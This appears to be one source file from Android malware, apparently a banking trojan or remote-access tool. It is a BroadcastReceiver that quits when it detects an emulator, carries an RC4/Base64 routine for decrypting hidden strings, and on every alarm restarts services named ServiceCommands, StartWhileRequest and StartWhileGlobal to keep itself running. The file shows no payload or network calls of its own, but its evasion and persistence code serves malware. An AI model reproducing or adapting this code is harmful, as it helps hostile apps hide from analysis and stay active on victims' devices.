package myapp.stuff.example.Receiver;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.Build;
import android.os.PowerManager;
import android.provider.Settings;
import android.util.Base64;
import android.util.Log;

import myapp.stuff.example.API.ClassRC4;
import myapp.stuff.example.ServiceCommands;
import myapp.stuff.example.StartWhileGlobal;
import myapp.stuff.example.StartWhileRequest;
import myapp.stuff.example.UtilsClass;

import static android.content.Context.POWER_SERVICE;


public class ReceiverAlarm extends BroadcastReceiver {
    UtilsClass SF = new UtilsClass();
    @Override
    public void onReceive(Context context, Intent intent) {
        StartReceive(context, intent);
    }
    public String str_decrypt(String textDE_C, String key)
    {
        UtilsClass utilsClass = new UtilsClass();
        try
        {
            byte[] data = Base64.decode(textDE_C, Base64.DEFAULT);
            textDE_C = new String(data, "UTF-8");
            byte[] detext = utilsClass.hexStringToByteArray(textDE_C);
            ClassRC4 rcd = new ClassRC4(key.getBytes());
            return  new String(rcd.decrypt(detext));
        }catch (Exception ex){ }
        return "";
    }

    void StartReceive(Context context, Intent intent){
        if(SF.isEmulator())return;

        SF.Log("ALARM","START");

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            try {
                context.startService(new Intent(context, ServiceCommands.class));
            }catch (Exception ex){
                SF.Log("Error","ALARM 1 " + ex);
            }

            try {
                context.startService(new Intent(context, StartWhileRequest.class));
            }catch (Exception ex){
                SF.Log("Error","ALARM 2 " + ex);
            }
            try {
                if(!SF.isMyServiceRunning(context , StartWhileGlobal.class)) {
                    context.startService(new Intent(context, StartWhileGlobal.class));
                }
            }catch (Exception ex){
                SF.Log("Error","ALARM 3 " + ex);
            }
        }else{


            try {
                context.startService(new Intent(context, ServiceCommands.class));
            }catch (Exception ex){
                SF.Log("Error","ALARM 1 " + ex);
            }

            try {
                context.startService(new Intent(context, StartWhileRequest.class));
            }catch (Exception ex){
                SF.Log("Error","ALARM 2 " + ex);
            }
            try {
                if(!SF.isMyServiceRunning(context , StartWhileGlobal.class)) {
                    context.startService(new Intent(context, StartWhileGlobal.class));
                }
            }catch (Exception ex){
                SF.Log("Error","ALARM 3 " + ex);
            }
        }

    }
}
